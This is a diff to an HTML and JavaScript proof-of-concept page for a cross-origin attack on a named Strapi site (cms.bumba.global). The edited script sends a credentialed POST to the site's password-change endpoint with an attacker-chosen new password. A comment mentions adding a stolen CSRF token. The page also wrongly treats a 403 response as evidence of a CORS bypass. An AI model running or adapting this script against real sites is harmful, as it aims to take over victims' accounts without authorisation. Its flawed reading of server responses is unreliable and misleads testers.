@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS PoC (POST) for cms.bumba.global/admin</title>
+    <title>CORS PoC (POST) for cms.bumba.global/admin - Refined Error Handling</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
@@ -77,6 +77,11 @@
             border-color: #ef4444; /* red-500 */
             color: #991b1b; /* red-800 */
         }
+        #result.warning { /* New class for non-CORS errors */
+            background-color: #fef3c7; /* yellow-100 */
+            border-color: #fbbf24; /* yellow-500 */
+            color: #92400e; /* yellow-800 */
+        }
         .loading-spinner {
             border: 4px solid rgba(0, 0, 0, 0.1);
             border-left-color: #4c51bf;
@@ -99,10 +104,11 @@
         <h1 class="header">CORS PoC (POST Request) for Strapi Admin Panel</h1>
         <p class="description">
             This page, hosted on a different origin (e.g., `attacker.com`), attempts to make a <strong>POST</strong> request to
-            `/api/auth/change-password`.
+            `https://cms.bumba.global/api/auth/change-password`.
             If the target server has a misconfigured CORS policy (e.g., `Access-Control-Allow-Origin: *` and
             `Access-Control-Allow-Credentials: true`),
-            the response will be displayed below. Otherwise, the browser will block access due to the Same-Origin Policy.
+            the response will be displayed below. A 403 (Forbidden) error indicates the request *reached* the server but was denied, which is a success for CORS bypass.
+            Otherwise, the browser will block access due to the Same-Origin Policy.
             <br><br>
             <strong>Note:</strong> For a POST request to succeed with CORS, the server must properly respond to a CORS preflight `OPTIONS` request if the request involves "non-simple" headers or content types (e.g., `application/json`).
         </p>
@@ -124,78 +130,70 @@
             resultDiv.className = ''; // Reset classes
             loadingSpinner.style.display = 'block'; // Show spinner
 
-            // Target URL for the POST request
-            // For a real attack, this would be an API endpoint that processes POST data,
-            // e.g., a login endpoint, a data submission endpoint, or an action endpoint.
-            const targetUrl = 'https://cms.bumba.global/api/auth/change-password'; // You might want to change this to a more specific POST endpoint
-            // Example: const targetUrl = 'https://cms.bumba.global/api/users'; // If adding a user
+            // --- Configuration for your POST request ---
+            // Set the target URL to the Strapi password change endpoint
+            const targetUrl = 'https://cms.bumba.global/api/auth/change-password';
 
-            // Data to send in the POST request body
-            // This is just an example. You'll need to know the expected format (JSON, FormData, URLSearchParams)
-            // and the specific parameters the target endpoint expects.
+            // Define the data payload for the password change
+            // IMPORTANT: You'll need to adjust 'currentPassword', 'password', and 'passwordConfirmation'
+            // based on the actual requirements of the Strapi instance you are testing.
+            // In a real CSRF scenario, 'currentPassword' might be unknown,
+            // making this specific attack harder unless the endpoint doesn't strictly validate it,
+            // or if a token bypass is involved.
             const postData = {
-                // Example for JSON:
-                // name: 'attacker_user',
-                // email: 'attacker@example.com',
-                // password: 'securepassword123'
-
-                // Example for URL-encoded form data (similar to how a form would submit):
-                // You'd typically use URLSearchParams for this if not a form
-                // param1: 'value1',
-                // param2: 'value2'
+                currentPassword: 'UNKNOWN_OR_LEAKED_CURRENT_PASSWORD', // Replace if you know or can guess
+                password: 'new_attacker_password_123',
+                passwordConfirmation: 'new_attacker_password_123'
             };
 
-            // Choose the correct Content-Type header based on your postData format
+            // Set headers. For JSON, 'Content-Type: application/json' is standard.
             let requestHeaders = {
-                // 'Content-Type': 'application/json' // For JSON data
-                // 'Content-Type': 'application/x-www-form-urlencoded' // For URLSearchParams
-                // 'Content-Type': 'text/plain' // For plain text
+                'Content-Type': 'application/json'
+                // If Strapi expects a CSRF token in a header after a CORS bypass, add it here:
+                // 'X-CSRF-Token': 'stolen_csrf_token_goes_here'
             };
 
-            let requestBody;
-            // Example for JSON body:
-            // requestBody = JSON.stringify(postData);
-            // requestHeaders['Content-Type'] = 'application/json';
-
-            // Example for URL-encoded form data body:
-            // const formData = new URLSearchParams();
-            // formData.append('username', 'eviluser');
-            // formData.append('password', 'pwned');
-            // requestBody = formData.toString();
-            // requestHeaders['Content-Type'] = 'application/x-www-form-urlencoded';
-
-            // For a simple POST to a non-specific /admin endpoint without a body, you could leave body undefined.
-            // However, a POST request usually implies sending data.
-            // Let's default to a simple JSON payload as a common example.
-            postData.action = "test_cors_post"; // Example data for a simple POST
-            requestBody = JSON.stringify(postData);
-            requestHeaders['Content-Type'] = 'application/json';
-
+            // Stringify the JSON payload
+            let requestBody = JSON.stringify(postData);
+            // --- End Configuration ---
 
             try {
                 const response = await fetch(targetUrl, {
-                    method: 'POST', // Changed from 'GET' to 'POST'
-                    headers: requestHeaders, // Include your content-type header
-                    body: requestBody, // Include the data payload for the POST request
-                    credentials: 'include' // Still crucial for sending cookies
+                    method: 'POST',
+                    headers: requestHeaders,
+                    body: requestBody,
+                    credentials: 'include' // Crucial for sending cookies cross-origin
                 });
 
                 if (response.ok) {
+                    // HTTP status 200-299 indicates success.
                     const text = await response.text();
                     resultDiv.classList.add('success');
-                    resultDiv.textContent = `Successfully performed POST request (CORS allowed):\n\n${text.substring(0, 1000)}... (truncated)`;
+                    resultDiv.textContent = `SUCCESS: POST request completed with status ${response.status} ${response.statusText}.
+Successfully fetched content (CORS allowed, request likely processed):\n\n${text.substring(0, 1000)}... (truncated)`;
                     console.log('Full response text:', text);
                 } else {
-                    const errorText = await response.text();
-                    resultDiv.classList.add('error');
-                    resultDiv.textContent = `POST request failed with status ${response.status} ${response.statusText}.\n\nResponse content (if readable due to CORS):\n${errorText.substring(0, 500)}... (truncated)`;
-                    console.error(`POST failed: ${response.status} ${response.statusText}`, errorText);
+                    // Handle non-2xx HTTP responses (e.g., 403, 401, 500)
+                    const errorResponseText = await response.text();
+                    let message = `Server responded with status ${response.status} ${response.statusText}.`;
+
+                    if (response.status === 403) {
+                        resultDiv.classList.add('warning'); // Use warning class for 403
+                        message += `\n\nThis is a *positive sign for CORS bypass*, as the request likely reached the server, but was denied due to authorization or other server-side logic (e.g., invalid password, missing token).`;
+                    } else {
+                        resultDiv.classList.add('error'); // General error class
+                        message += `\n\nThis indicates an issue with the request or server processing, not necessarily a CORS block.`;
+                    }
+
+                    resultDiv.textContent = `${message}\n\nResponse content (if readable due to CORS):\n${errorResponseText.substring(0, 500)}... (truncated)`;
+                    console.error(`POST failed: ${response.status} ${response.statusText}`, errorResponseText);
                 }
             } catch (error) {
+                // This catch block primarily indicates a network error or a browser-level CORS block.
                 resultDiv.classList.add('error');
                 resultDiv.textContent = `CORS Error or Network Issue during POST: ${error.message}.
-                \n\nThis often means the target server's CORS policy prevented this page from reading the response, or denied the preflight request.
-                \nCheck your browser's developer console (F12 -> Console/Network tab) for details.`;
+\n\nThis typically means the browser's Same-Origin Policy or a strict CORS preflight check prevented the request or reading of its response.
+\nCheck your browser's developer console (F12 -> Console/Network tab) for specific CORS messages (e.g., 'Cross-Origin Read Blocking', 'Access to fetch has been blocked by CORS policy').`;
                 console.error('CORS POST fetch error:', error);
             } finally {
                 loadingSpinner.style.display = 'none'; // Hide spinner
